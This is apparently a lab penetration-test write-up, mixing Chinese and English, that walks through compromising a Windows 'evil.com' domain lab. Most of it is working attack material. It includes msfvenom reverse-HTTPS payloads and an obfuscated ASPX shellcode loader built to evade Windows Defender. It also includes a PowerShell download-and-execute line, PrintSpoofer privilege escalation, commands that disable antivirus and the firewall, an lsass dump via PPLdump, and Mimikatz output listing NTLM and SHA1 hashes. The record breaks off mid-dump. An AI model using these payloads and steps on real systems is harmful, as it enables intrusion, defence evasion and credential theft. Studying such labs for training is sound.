## Initial Foothold

### nmap扫描 
┌──(root💀kali)-[/home/osep/Modules/module17]
└─# nmap -sV -sT -Pn -A 192.168.96.130-132
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-27 03:43 UTC
Nmap scan report for ip-192-168-96-130.us-west-1.compute.internal (192.168.96.130)
Host is up (0.067s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-27 03:44:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: evil.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: evil.com0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EVIL
|   NetBIOS_Domain_Name: EVIL
|   NetBIOS_Computer_Name: DC02
|   DNS_Domain_Name: evil.com
|   DNS_Computer_Name: dc02.evil.com
|   DNS_Tree_Name: evil.com
|   Product_Version: 10.0.17763
|_  System_Time: 2021-08-27T03:44:22+00:00
| ssl-cert: Subject: commonName=dc02.evil.com
| Not valid before: 2021-08-26T03:38:41
|_Not valid after:  2022-02-25T03:38:41
|_ssl-date: 2021-08-27T03:45:03+00:00; +27s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC02; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 26s, deviation: 0s, median: 26s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-27T03:44:27
|_  start_date: N/A

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
-   Hop 1 is the same as for 192.168.96.132
2   66.60 ms ip-192-168-96-130.us-west-1.compute.internal (192.168.96.130)

Nmap scan report for ip-192-168-96-131.us-west-1.compute.internal (192.168.96.131)
Host is up (0.067s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EVIL
|   NetBIOS_Domain_Name: EVIL
|   NetBIOS_Computer_Name: FILE01
|   DNS_Domain_Name: evil.com
|   DNS_Computer_Name: file01.evil.com
|   DNS_Tree_Name: evil.com
|   Product_Version: 10.0.17763
|_  System_Time: 2021-08-27T03:44:23+00:00
| ssl-cert: Subject: commonName=file01.evil.com
| Not valid before: 2021-08-26T03:39:26
|_Not valid after:  2022-02-25T03:39:26
|_ssl-date: 2021-08-27T03:45:03+00:00; +27s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): AVtech embedded (87%), Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%), Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 26s, deviation: 0s, median: 26s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-27T03:44:32
|_  start_date: N/A

TRACEROUTE (using proto 1/icmp)
HOP RTT    ADDRESS
-   Hop 1 is the same as for 192.168.96.132
2   ... 30

Nmap scan report for ip-192-168-96-132.us-west-1.compute.internal (192.168.96.132)
Host is up (0.067s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: 
|   title: \x0D
|_\x0D
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EVIL
|   NetBIOS_Domain_Name: EVIL
|   NetBIOS_Computer_Name: WEB01
|   DNS_Domain_Name: evil.com
|   DNS_Computer_Name: web01.evil.com
|   DNS_Tree_Name: evil.com
|   Product_Version: 10.0.17763
|_  System_Time: 2021-08-27T03:44:23+00:00
| ssl-cert: Subject: commonName=web01.evil.com
| Not valid before: 2021-08-26T03:39:49
|_Not valid after:  2022-02-25T03:39:49
|_ssl-date: 2021-08-27T03:45:03+00:00; +27s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 26s, deviation: 0s, median: 26s

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   66.34 ms ip-192-168-49-1.us-west-1.compute.internal (192.168.49.1)
2   66.48 ms ip-192-168-96-132.us-west-1.compute.internal (192.168.96.132)

Post-scan script results:
| clock-skew: 
|   26s: 
|     192.168.96.131 (ip-192-168-96-131.us-west-1.compute.internal)
|     192.168.96.130 (ip-192-168-96-130.us-west-1.compute.internal)
|_    192.168.96.132 (ip-192-168-96-132.us-west-1.compute.internal)
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 79.01 seconds

### Web 攻击
发现192.168.96.132 开放web服务
上传test.txt 发现上传路径 192.168.96.132/upload/test.txt 
```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.49.96 lport=443 -f aspx -o met.aspx
```
上传发现server存在windows defender杀软，故使用helper对shellcode进行转换
```bash
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.49.96 lport=8443 -f csharp
```
### 免杀制作

使用helper.exe 加密

```aspx
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000,0x4, 0);
        if(mem == null)
        {
            return;
        }
        byte[] fg7Js = new byte[679] {0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02, 0x02, 0x02, 0x43, 0x53, 0x43, 0x52, 0x54, 0x53, 0x58, 0x4a, 0x33, 0xd4, 0x67, 0x4a, 0x8d, 0x54, 0x62, 0x4a, 0x8d, 0x54, 0x1a, 0x4a, 0x8d, 0x54, 0x22, 0x4f, 0x33, 0xcb, 0x4a, 0x11, 0xb9, 0x4c, 0x4c, 0x4a, 0x8d, 0x74, 0x52, 0x4a, 0x33, 0xc2, 0xae, 0x3e, 0x63, 0x7e, 0x04, 0x2e, 0x22, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0xe4, 0xef, 0x54, 0x43, 0x53, 0x4a, 0x8d, 0x54, 0x22, 0x8d, 0x44, 0x3e, 0x4a, 0x03, 0xd2, 0x68, 0x83, 0x7a, 0x1a, 0x0d, 0x04, 0x11, 0x87, 0x74, 0x02, 0x02, 0x02, 0x8d, 0x82, 0x8a, 0x02, 0x02, 0x02, 0x4a, 0x87, 0xc2, 0x76, 0x69, 0x4a, 0x03, 0xd2, 0x46, 0x8d, 0x42, 0x22, 0x8d, 0x4a, 0x1a, 0x4b, 0x03, 0xd2, 0x52, 0xe5, 0x58, 0x4f, 0x33, 0xcb, 0x4a, 0x01, 0xcb, 0x43, 0x8d, 0x36, 0x8a, 0x4a, 0x03, 0xd8, 0x4a, 0x33, 0xc2, 0xae, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0x3a, 0xe2, 0x77, 0xf3, 0x4e, 0x05, 0x4e, 0x26, 0x0a, 0x47, 0x3b, 0xd3, 0x77, 0xda, 0x5a, 0x46, 0x8d, 0x42, 0x26, 0x4b, 0x03, 0xd2, 0x68, 0x43, 0x8d, 0x0e, 0x4a, 0x46, 0x8d, 0x42, 0x1e, 0x4b, 0x03, 0xd2, 0x43, 0x8d, 0x06, 0x8a, 0x4a, 0x03, 0xd2, 0x43, 0x5a, 0x43, 0x5a, 0x60, 0x5b, 0x5c, 0x43, 0x5a, 0x43, 0x5b, 0x43, 0x5c, 0x4a, 0x85, 0xee, 0x22, 0x43, 0x54, 0x01, 0xe2, 0x5a, 0x43, 0x5b, 0x5c, 0x4a, 0x8d, 0x14, 0xeb, 0x4d, 0x01, 0x01, 0x01, 0x5f, 0x4a, 0x33, 0xdd, 0x55, 0x4b, 0xc0, 0x79, 0x6b, 0x70, 0x6b, 0x70, 0x67, 0x76, 0x02, 0x43, 0x58, 0x4a, 0x8b, 0xe3, 0x4b, 0xc9, 0xc4, 0x4e, 0x79, 0x28, 0x09, 0x01, 0xd7, 0x55, 0x55, 0x4a, 0x8b, 0xe3, 0x55, 0x5c, 0x4f, 0x33, 0xc2, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xbc, 0x3c, 0x58, 0x7b, 0xa9, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0x10, 0x02, 0x02, 0x02, 0x33, 0x3b, 0x34, 0x30, 0x33, 0x38, 0x3a, 0x30, 0x36, 0x3b, 0x30, 0x3b, 0x38, 0x02, 0x5c, 0x4a, 0x8b, 0xc3, 0x4b, 0xc9, 0xc2, 0xfd, 0x22, 0x02, 0x02, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x6c, 0x05, 0x55, 0x4b, 0xbc, 0x59, 0x8b, 0xa1, 0xc8, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0x80, 0x02, 0x02, 0x02, 0x31, 0x37, 0x77, 0x5c, 0x5b, 0x32, 0x3a, 0x7c, 0x6e, 0x34, 0x72, 0x5b, 0x67, 0x6f, 0x44, 0x2f, 0x63, 0x68, 0x39, 0x45, 0x68, 0x74, 0x53, 0x49, 0x63, 0x79, 0x35, 0x61, 0x7b, 0x4d, 0x49, 0x36, 0x5c, 0x4c, 0x6d, 0x48, 0x66, 0x3b, 0x48, 0x6f, 0x74, 0x70, 0x75, 0x2f, 0x33, 0x5c, 0x2f, 0x45, 0x54, 0x6b, 0x6b, 0x76, 0x38, 0x65, 0x58, 0x63, 0x5c, 0x73, 0x32, 0x32, 0x77, 0x72, 0x53, 0x38, 0x78, 0x66, 0x6a, 0x52, 0x2f, 0x7a, 0x77, 0x3b, 0x50, 0x54, 0x61, 0x57, 0x59, 0x66, 0x3b, 0x4b, 0x7a, 0x54, 0x56, 0x4c, 0x45, 0x6f, 0x66, 0x63, 0x45, 0x4a, 0x68, 0x77, 0x35, 0x53, 0x49, 0x43, 0x64, 0x63, 0x73, 0x6e, 0x7b, 0x6f, 0x6c, 0x79, 0x72, 0x49, 0x72, 0x5b, 0x35, 0x61, 0x67, 0x46, 0x71, 0x4b, 0x4a, 0x6b, 0x6b, 0x5a, 0x7b, 0x49, 0x4f, 0x68, 0x67, 0x44, 0x53, 0x02, 0x4a, 0x8b, 0xc3, 0x55, 0x5c, 0x43, 0x5a, 0x4f, 0x33, 0xcb, 0x55, 0x4a, 0xba, 0x02, 0x34, 0xaa, 0x86, 0x02, 0x02, 0x02, 0x02, 0x52, 0x55, 0x55, 0x4b, 0xc9, 0xc4, 0xed, 0x57, 0x30, 0x3d, 0x01, 0xd7, 0x4a, 0x8b, 0xc8, 0x6c, 0x0c, 0x61, 0x4a, 0x8b, 0xf3, 0x6c, 0x21, 0x5c, 0x54, 0x6a, 0x82, 0x35, 0x02, 0x02, 0x4b, 0x8b, 0xe2, 0x6c, 0x06, 0x43, 0x5b, 0x4b, 0xbc, 0x77, 0x48, 0xa0, 0x88, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4f, 0x33, 0xc2, 0x55, 0x5c, 0x4a, 0x8b, 0xf3, 0x4f, 0x33, 0xcb, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xc9, 0xc4, 0x2f, 0x08, 0x1a, 0x7d, 0x01, 0xd7, 0x87, 0xc2, 0x77, 0x21, 0x4a, 0xc9, 0xc3, 0x8a, 0x15, 0x02, 0x02, 0x4b, 0xbc, 0x46, 0xf2, 0x37, 0xe2, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x01, 0xd1, 0x76, 0x04, 0xed, 0xac, 0xea, 0x57, 0x02, 0x02, 0x02, 0x55, 0x5b, 0x6c, 0x42, 0x5c, 0x4b, 0x8b, 0xd3, 0xc3, 0xe4, 0x12, 0x4b, 0xc9, 0xc2, 0x02, 0x12, 0x02, 0x02, 0x4b, 0xbc, 0x5a, 0xa6, 0x55, 0xe7, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x95, 0x55, 0x55, 0x4a, 0x8b, 0xe9, 0x4a, 0x8b, 0xf3, 0x4a, 0x8b, 0xdc, 0x4b, 0xc9, 0xc2, 0x02, 0x22, 0x02, 0x02, 0x4b, 0x8b, 0xfb, 0x4b, 0xbc, 0x14, 0x98, 0x8b, 0xe4, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x85, 0xc6, 0x22, 0x87, 0xc2, 0x76, 0xb4, 0x68, 0x8d, 0x09, 0x4a, 0x03, 0xc5, 0x87, 0xc2, 0x77, 0xd4, 0x5a, 0xc5, 0x5a, 0x6c, 0x02, 0x5b, 0x4b, 0xc9, 0xc4, 0xf2, 0xb7, 0xa4, 0x58, 0x01, 0xd7};
        for(int i = 0; i < fg7Js.Length; i++)
        {
            fg7Js[i] = (byte)(((uint)fg7Js[i] - 2) & 0xFF);
        }
        IntPtr pZj1YD5emo0y = VirtualAlloc(IntPtr.Zero,(UIntPtr)fg7Js.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(fg7Js,0,pZj1YD5emo0y,fg7Js.Length);
        IntPtr yn5D8NOGTeBt = IntPtr.Zero;
        IntPtr d_X7Z = CreateThread(IntPtr.Zero,UIntPtr.Zero,pZj1YD5emo0y,IntPtr.Zero,0,ref yn5D8NOGTeBt);
    }
</script>
```

### GetShell

```bash
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://192.168.49.96:8443
[!] https://192.168.49.96:8443 handling request from 192.168.96.132; (UUID: c37xx5nz) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.49.96:8443 handling request from 192.168.96.132; (UUID: c37xx5nz) Staging x64 payload (201308 bytes) ...
[!] https://192.168.49.96:8443 handling request from 192.168.96.132; (UUID: c37xx5nz) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (192.168.49.96:8443 -> 127.0.0.1) at 2021-08-27 06:37:30 +0000
```

## 信息收集及提权

### 获取稳定shell
meterpreter > getuid
Server username: IIS APPPOOL\DefaultAppPool
meterpreter > execute -H -f notepad
Process 888 created.
meterpreter > migrate 888
[*] Migrating from 3560 to 888...
[*] Migration completed successfully.

### 环境收集
(new-object system.net.webclient).downloadstring('http://192.168.49.96:8080/HostRecon.ps1') | IEX
查看杀软：Invoke-HostRecon
查看是否LSA保护：Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
查看是否有app白名单：Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe

### 提权

whoami /priv

PrintSpoofer64.exe -i -c cmd.exe

获得了管理员权限
关闭杀软

```cmd
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true

NetSh Advfirewall set allprofiles state off
```
再已管理员身份执行met.exe 获得meterpreter shell

```bash
meterpreter > ps -S spoolsv
Filtering on 'spoolsv'

Process List
============

 PID   PPID  Name         Arch  Session  User                 Path
 ---   ----  ----         ----  -------  ----                 ----
 2084  556   spoolsv.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\spoolsv.exe

meterpreter > migrate 2084
```

## 获取hash

### LSAProtection Bypass

#### 使用mimikatz自带
!+

从未成功过

#### PPLKiller

```
c:\Users\Public\Downloads>PPLKiller.exe
PPLKiller.exe
PPLKiller version 0.2 by @aceb0nd
Usage: PPLKiller.exe
 [/disablePPL <PID>]
 [/disableLSAProtection]
 [/makeSYSTEM <PID>]
 [/makeSYSTEMcmd]
 [/installDriver]
 [/uninstallDriver]
```

#### PPLDump

```
PPLdump.exe
 _____ _____ __      _               
|  _  |  _  |  |   _| |_ _ _____ ___ 
|   __|   __|  |__| . | | |     | . |  version 0.4
|__|  |__|  |_____|___|___|_|_|_|  _|  by @itm4n
                                |_|  

Description:
  Dump the memory of a Protected Process Light (PPL) with a *userland* exploit

Usage: 
  PPLdump.exe [-v] [-d] [-f] <PROC_NAME|PROC_ID> <DUMP_FILE>

Arguments:
  PROC_NAME  The name of a Process to dump
  PROC_ID    The ID of a Process to dump
  DUMP_FILE  The path of the output dump file

Options:
  -v         (Verbose) Enable verbose mode
  -d         (Debug) Enable debug mode (implies verbose)
  -f         (Force) Bypass DefineDosDevice error check

Examples:
  PPLdump.exe lsass.exe lsass.dmp
  PPLdump.exe -v 720 out.dmp
  
C:\Users\Public\Downloads>PPLdump.exe lsass.exe lsass.dump
PPLdump.exe lsass.exe lsass.dump
[+] Dump successfull! :)


```

## Mimikatz 获取hash

```
mimikatz # sekurlsa::minidump lsass.dump
Switch to MINIDUMP : 'lsass.dump'

mimikatz # sekurlsa::logonPasswords full 
Opening : 'lsass.dump' file for minidump...

Authentication Id : 0 ; 1346354 (00000000:00148b32)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 8/26/2021 8:44:04 PM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
   msv :
    [00000003] Primary
    * Username : WEB01$
    * Domain   : EVIL
    * NTLM     : 77627f5c17e9cea651a455bb4a155356
    * SHA1     : f1743a733dbf065bd9e6c9a278383ac6ccdaba97
   tspkg :
   wdigest :
    * Username : WEB01$
    * Domain   : EVIL
    * Password : (null)
   kerberos :
    * Username : WEB01$
    * Domain   : EVIL.COM
    * Password : (null)
   ssp :
   credman :

Authentication Id : 0 ; 455367 (00000000:0006f2c7)
Session           : Interactive from 0
User Name         : Administrator
Domain            : WEB01
Logon Server      : WEB01
Logon Time        : 8/26/2021 8:39:37 PM
SID               : S-1-5-21-1607807028-3881622887-1966001951-500
   msv :
    [00000003] Primary
    * Username : Administrator
    * Domain   : WEB01
    * NTLM     : 87cc5fd863cb29f2d1fec46733f46274
    * SHA1     : af783494dc34399abf270527f45c62b89ab206bd
   tspkg :
   wdigest :
    * Username : Administrator
    * Domain   : WEB01
    * Password : (null)
   kerberos :
    * Username : Administrator
    * Domain   : WEB01
    * Password : (null)
   ssp :
   credman :

Authentication Id : 0 ; 329027 (00000000:00050543)
Session           : Interactive from 0
User Name         : Administrator
Domain            : WEB01
Logon Server      : WEB01
Logon Time        : 10/29/2020 3:49:29 PM
SID               : S-1-5-21-1607807028-3881622887-1966001951-500
   msv :
    [00000003] Primary
    * Username : Administrator
    * Domain   : WEB01
    * NTLM     : 87cc5fd863cb29f2d1fec46733f46274
    * SHA1     : af783494dc34399abf270527f45c62b89ab206bd
   tspkg :
   wdigest :
    * Username : Administrator
    * Domain   : WEB01
    * Password : (null)
   kerberos :
    * Username : Administrator
    * Domain   : WEB01
    * Password : (null)
   ssp :
   credman :

Authentication Id : 0 ; 69852 (00000000:000110dc)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/29/2020 3:47:10 PM
SID               : S-1-5-90-0-1
   msv :
    [00000003] Primary
    * Username : WEB01$
    * Domain   : EVIL
    * NTLM     : b07c09086397291fa00b568b3ea90f08
    * SHA1     : da29115a64631a8fd738e50df0290f62cc0a21ec
   tspkg :
   wdigest :
    * Username : WEB01$
    * Domain   : EVIL
    * Password : (null)
   kerberos :
    * Username : WEB01$
    * Domain   : evil.com
    * Password : 7d d4 b3 39 4a 47 39 c7 13 f0 83 25 db b0 34 c8 1c b9 fa b5 db 96 56 04 32 41 fc a8 20 86 f4 a9 34 f8 f3 42 f1 50 35 5d 0c 74 2c 26 20 fc f7 a7 07 db 5f fe f8 1a c8 90 9b 26 84 67 a4 6e bd 91 b9 79 7a 2d 77 10 e4 62 d8 76 a6 9d 21 67 da 4d 7f 84 bd 39 33 cc 3a f3 5b 9e 84 e3 a1 0d 20 ce ad 57 02 a7 0e ec 25 db 4e f1 89 d7 be 1a b6 58 a0 1f d5 21 1a 25 69 64 f4 14 58 30 f0 4b 15 11 ca b2 8d e5 20 38 e4 38 36 de 9b 04 9e 11 21 80 d2 da 78 10 f5 4c e9 6f 34 8d 84 da 06 db 96 66 29 35 fe 20 07 6f d5 62 a4 61 a8 ee 80 f1 79 97 5d f8 29 5f 8e 8b 26 bc 85 36 45 c9 75 91 f4 f4 c4 72 d9 49 ae f5 f4 da 14 64 f7 d6 b4 22 49 e4 8c c3 e5 ee 07 19 74 73 01 28 59 5e 96 7e 70 20 6f 01 3f 4d 26 8c d3 9b 36 2a a6 6e ca 40 9e 4f 
   ssp :
   credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WEB01$
Domain            : EVIL
Logon Server      : (null)
Logon Time        : 10/29/2020 3:47:10 PM
SID               : S-1-5-20
   msv :
    [00000003] Primary
    * Username : WEB01$
    * Domain   : EVIL
    * NTLM     : 77627f5c17e9cea651a455bb4a155356
    * SHA1     : f1743a733dbf065bd9e6c9a278383ac6ccdaba97
   tspkg :
   wdigest :
    * Username : WEB01$
    * Domain   : EVIL
    * Password : (null)
   kerberos :
    * Username : web01$
    * Domain   : EVIL.COM
    * Password : 95 0f f9 df e2 4d af 3e f1 5e e0 a9 f3 78 0b 91 d2 d5 5e b9 11 1f b5 bf e2 14 dc e4 91 78 0e 0f a4 e4 56 1a 97 2b ed f8 f8 fd b3 5e 58 2d 19 ef bf 25 f3 cc 15 01 00 09 9b e6 f0 49 d0 bf 22 6c 32 02 f3 fb cd 7d 0c a6 19 03 92 31 02 8d d3 36 b0 0c 73 cb 4c cf 40 c5 f5 43 d5 91 7c 7e aa da 8c 57 dc 96 36 bc dd a1 d0 87 8a b4 da 13 7c b0 fe 4d 87 47 83 cf 2d 33 2c 98 a1 7d 4d d3 93 45 65 3b c1 45 0f c5 64 88 37 d5 b5 95 6b 31 0b e8 c3 e9 73 b6 f3 e3 e6 1e 3c c0 db 1b c5 2c ed 4f 7c 4d 43 6b 0f 7e 0f bc f4 bb 99 d4 fd cb 0f 66 3a e6 14 7d a1 d5 d5 83 92 5c 3e ca 61 cd 41 25 8c 04 bb 69 f0 11 5e e3 dd 69 b7 08 f5 bd c7 57 ad 94 15 cd 45 ae 54 68 a2 b9 2c 1a bc 60 9c ae 16 38 7d 37 d1 d9 f5 e9 87 ea 75 9a 83 dc 10 88 
   ssp :
   credman :

Authentication Id : 0 ; 40177 (00000000:00009cf1)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 10/29/2020 3:47:10 PM
SID               : S-1-5-96-0-1
   msv :
    [00000003] Primary
    * Username : WEB01$
    * Domain   : EVIL
    * NTLM     : 77627f5c17e9cea651a455bb4a155356
    * SHA1     : f1743a733dbf065bd9e6c9a278383ac6ccdaba97
   tspkg :
   wdigest :
    * Username : WEB01$
    * Domain   : EVIL
    * Password : (null)
   kerberos :
    * Username : WEB01$
    * Domain   : evil.com
    * Password : 95 0f f9 df e2 4d af 3e f1 5e e0 a9 f3 78 0b 91 d2 d5 5e b9 11 1f b5 bf e2 14 dc e4 91 78 0e 0f a4 e4 56 1a 97 2b ed f8 f8 fd b3 5e 58 2d 19 ef bf 25 f3 cc 15 01 00 09 9b e6 f0 49 d0 bf 22 6c 32 02 f3 fb cd 7d 0c a6 19 03 92 31 02 8d d3 36 b0 0c 73 cb 4c cf 40 c5 f5 43 d5 91 7c 7e aa da 8c 57 dc 96 36 bc dd a1 d0 87 8a b4 da 13 7c b0 fe 4d 87 47 83 cf 2d 33 2c 98 a1 7d 4d d3 93 45 65 3b c1 45 0f c5 64 88 37 d5 b5 95 6b 31 0b e8 c3 e9 73 b6 f3 e3 e6 1e 3c c0 db 1b c5 2c ed 4f 7c 4d 43 6b 0f 7e 0f bc f4 bb 99 d4 fd cb 0f 66 3a e6 14 7d a1 d5 d5 83 92 5c 3e ca 61 cd 41 25 8c 04 bb 69 f0 11 5e e3 dd 69 b7 08 f5 bd c7 57 ad 94 15 cd 45 ae 54 68 a2 b9 2c 1a bc 60 9c ae 16 38 7d 37 d1 d9 f5 e9 87 ea 75 9a 83 dc 10 88 
   ssp :
   credman :

Authentication Id : 0 ; 38698 (00000000:0000972a)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 10/29/2020 3:47:09 PM
SID               : 
   msv :
    [00000003] Primary
    * Username : WEB01$
    * Domain   : EVIL
    * NTLM     : 77627f5c17e9cea651a455bb4a155356
    * SHA1     : f1743a733dbf065bd9e6c9a278383ac6ccdaba97
   tspkg :
   wdigest :
   kerberos :
   ssp :
   credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/29/2020 3:47:12 PM
SID               : S-1-5-17
   msv :
   tspkg :
   wdigest :
    * Username : (null)
    * Domain   : (null)
    * Password : (null)
   kerberos :
   ssp :
   credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/29/2020 3:47:10 PM
SID               : S-1-5-19
   msv :
   tspkg :
   wdigest :
    * Username : (null)
    * Domain   : (null)
    * Password : (null)
   kerberos :
    * Username : (null)
    * Domain   : (null)
    * Password : (null)
   ssp :
   credman :

Authentication Id : 0 ; 69833 (00000000:000110c9)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/29/2020 3:47:10 PM
SID               : S-1-5-90-0-1
   msv :
    [00000003] Primary
    * Username : WEB01$
    * Domain   : EVIL
    * NTLM     : 77627f5c17e9cea651a455bb4a155356
    * SHA1     : f1743a733dbf065bd9e6c9a278383ac6ccdaba97
   tspkg :
   wdigest :
    * Username : WEB01$
    * Domain   : EVIL
    * Password : (null)
   kerberos :
    * Username : WEB01$
    * Domain   : evil.com
    * Password : 95 0f f9 df e2 4d af 3e f1 5e e0 a9 f3 78 0b 91 d2 d5 5e b9 11 1f b5 bf e2 14 dc e4 91 78 0e 0f a4 e4 56 1a 97 2b ed f8 f8 fd b3 5e 58 2d 19 ef bf 25 f3 cc 15 01 00 09 9b e6 f0 49 d0 bf 22 6c 32 02 f3 fb cd 7d 0c a6 19 03 92 31 02 8d d3 36 b0 0c 73 cb 4c cf 40 c5 f5 43 d5 91 7c 7e aa da 8c 57 dc 96 36 bc dd a1 d0 87 8a b4 da 13 7c b0 fe 4d 87 47 83 cf 2d 33 2c 98 a1 7d 4d d3 93 45 65 3b c1 45 0f c5 64 88 37 d5 b5 95 6b 31 0b e8 c3 e9 73 b6 f3 e3 e6 1e 3c c0 db 1b c5 2c ed 4f 7c 4d 43 6b 0f 7e 0f bc f4 bb 99 d4 fd cb 0f 66 3a e6 14 7d a1 d5 d5 83 92 5c 3e ca 61 cd 41 25 8c 04 bb 69 f0 11 5e e3 dd 69 b7 08 f5 bd c7 57 ad 94 15 cd 45 ae 54 68 a2 b9 2c 1a bc 60 9c ae 16 38 7d 37 d1 d9 f5 e9 87 ea 75 9a 83 dc 10 88 
   ssp :
   credman :

Authentication Id : 0 ; 40078 (00000000:00009c8e)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 10/29/2020 3:47:10 PM
SID               : S-1-5-96-0-0
   msv :
    [00000003] Primary
    * Username : WEB01$
    * Domain   : EVIL
    * NTLM     : 77627f5c17e9cea651a455bb4a155356
    * SHA1     : f1743a733dbf065bd9e6c9a278383ac6ccdaba97
   tspkg :
   wdigest :
    * Username : WEB01$
    * Domain   : EVIL
